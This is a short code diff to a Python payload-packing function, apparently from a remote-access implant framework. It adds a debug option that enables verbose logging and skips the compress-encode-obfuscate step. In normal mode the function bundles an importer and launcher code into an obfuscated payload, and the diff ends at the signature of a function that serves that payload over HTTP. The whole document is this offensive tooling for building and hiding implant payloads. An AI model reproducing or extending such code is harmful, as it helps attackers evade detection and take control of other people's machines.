@@ -20,12 +20,15 @@ def getLinuxImportedModules():
         lines=f.read()
     return lines
 
-def pack_py_payload(conf):
+def pack_py_payload(conf, debug=False):
     print colorize('[+] ','green')+'generating payload ...'
-    fullpayload=[]
+    fullpayload = []
 
     with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
         pupyimportercode = f.read()
+
+    if debug:
+        pupyimportercode = pupyimportercode.replace('__debug = False', '__debug = True')
 
     fullpayload.append(
         '\n'.join([
@@ -41,12 +44,20 @@ def pack_py_payload(conf):
     )
 
     with open(os.path.join(ROOT,'pp.py')) as f:
-        code=f.read()
+        code = f.read()
+
+    if debug:
+        code = code.replace('logger.setLevel(logging.WARNING)', 'logger.setLevel(logging.DEBUG)')
 
     code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
     fullpayload.append(code+'\n')
 
-    return compress_encode_obfs('\n'.join(fullpayload)+'\n')
+    payload = '\n'.join(fullpayload) + '\n'
+
+    if debug:
+        return payload
+
+    return compress_encode_obfs(payload, main=True)
 
 
 def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
